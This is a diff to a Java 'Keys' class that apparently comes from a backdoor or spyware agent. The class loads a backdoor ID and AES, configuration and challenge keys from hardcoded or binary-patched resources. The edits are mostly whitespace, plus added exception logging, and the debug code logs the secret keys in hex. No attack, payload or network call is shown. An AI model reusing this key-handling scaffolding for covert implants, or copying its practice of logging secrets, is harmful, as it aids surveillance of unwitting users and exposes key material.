@@ -29,7 +29,7 @@ public class Keys {
 	/** The singleton. */
 	private volatile static Keys singleton;
 	private static int keyLen = 16;
-	
+
 	/**
 	 * Self.
 	 * 
@@ -41,13 +41,13 @@ public class Keys {
 				if (singleton == null) {
 					if (Cfg.KEYS) {
 						singleton = new KeysFake();
-						
+
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " Using hardcoded keys");
 						}
 					} else {
 						singleton = new Keys(true);
-						
+
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " Using binary patched keys");
 						}
@@ -85,10 +85,10 @@ public class Keys {
 			challengeKey = keyFromString(resource, 78, 32);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " backdoorId: " + new String(backdoorId)) ;//$NON-NLS-1$
-				Check.log(TAG + " aesKey: " + Utils.byteArrayToHex(aesKey)) ;//$NON-NLS-1$
-				Check.log(TAG + " confKey: " + Utils.byteArrayToHex(confKey)) ;//$NON-NLS-1$
-				Check.log(TAG + " challengeKey: " + Utils.byteArrayToHex(challengeKey)) ;//$NON-NLS-1$
+				Check.log(TAG + " backdoorId: " + new String(backdoorId));//$NON-NLS-1$
+				Check.log(TAG + " aesKey: " + Utils.byteArrayToHex(aesKey));//$NON-NLS-1$
+				Check.log(TAG + " confKey: " + Utils.byteArrayToHex(confKey));//$NON-NLS-1$
+				Check.log(TAG + " challengeKey: " + Utils.byteArrayToHex(challengeKey));//$NON-NLS-1$
 			}
 		}
 	}
@@ -191,7 +191,7 @@ public class Keys {
 	private byte[] keyFromString(byte[] resource, int from, int len) {
 		final byte[] res = Utils.copy(resource, from, len);
 		byte[] ret = keyFromString(new String(res));
-		
+
 		if (ret == null) {
 			return Utils.copy(resource, from, 16);
 		} else {
@@ -210,6 +210,10 @@ public class Keys {
 
 			return array;
 		} catch (final Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			return null;
 		}
 	}
